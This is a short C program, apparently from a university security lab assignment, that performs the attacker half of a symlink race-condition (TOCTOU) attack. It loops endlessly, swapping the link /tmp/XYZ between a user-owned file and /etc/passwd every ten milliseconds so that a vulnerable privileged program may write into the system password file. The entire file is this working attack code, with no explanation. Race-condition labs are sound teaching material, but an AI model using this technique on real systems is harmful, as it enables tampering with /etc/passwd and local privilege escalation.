#include <unistd.h>

int main(){
	while(1){
		unlink("/tmp/XYZ");
		symlink("/home/seed/Desktop/CS4293/assignment/Experiment/assignment2/task6/myfile", "/tmp/XYZ");
		usleep(10000);
		unlink("/tmp/XYZ");
		symlink("/etc/passwd", "/tmp/XYZ");
		usleep(10000);
	}
	return 0;
}